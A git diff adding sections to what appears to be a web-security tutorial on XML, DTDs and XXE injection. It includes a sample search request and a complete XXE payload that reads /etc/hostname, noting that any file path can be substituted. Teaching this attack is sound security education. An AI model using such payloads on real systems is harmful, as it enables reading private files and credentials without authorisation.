@@ -24,6 +24,7 @@ For Example,
 
 The above XML file defines a simple set of data enclosed in opening and closing tags.
 
+
 ### DTD
 
 > Document Type Definition also know as DTD is a set of declarations that define the structure of a XML document.
@@ -106,3 +107,76 @@ Now `person.dtd` will have,
   <!ELEMENT lastname (#PCDATA)>
   <!ELEMENT age (#PCDATA)>
 ```
+
+### XML Custom Entities
+
+XML Custom entities enables to reference a user-defined entity in a DTD.
+
+Example,
+
+```xml
+  <!DOCTYPE person [
+  <!ELEMENT person (#PCDATA) >
+  <!ENTITY name "John Doe">
+  ]>
+  <person>
+    &name;
+  </person>
+```
+
+The `&name;` would then be replace by `John Doe` because it's a custom entity defined in DTD.
+
+## Exploiting XXE Injection
+
+There are numerous XXE attacks but we will mainly focus few of them.
+
+### Reading Arbitrary files using XXE Injection
+
+To be able to read arbitrary files we need to do two things,
+
+1. Insert or modify an external entity that will reference our arbitrary file.
+2. Use the defined *external* entity in the XML that gets returned with the application's response along with the contents of the arbitrary file.
+
+Let's say you went to an e-commerce website and you found out that their search functionality uses **XML** in their POST data to send search term to the backend.
+
+POST Request sample,
+
+```post
+POST /search/ HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/xml
+Content-Length: 107
+DNT: 1
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?><term>Cars</term>
+```
+
+To retrieve contents of file at `/etc/hostname` we first define an external entity as,
+
+```xml
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/hostname'> ]>
+```
+
+and then, we use the external entity in the XML that will get returned as response to our request.
+
+```xml
+  <term>&xxe;</term>
+```
+
+Now our full XEE payload will become,
+
+```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/hostname'> ]>
+  <term>&xxe;</term>
+```
+
+Voila! The response we get is,
+
+`No results for "MY_COMPUTER."`
+
+Enclosed between the quotes is our contents of `/etc/hostname`. Just replace `/etc/hostname` with any file name to retrieve it's contents.
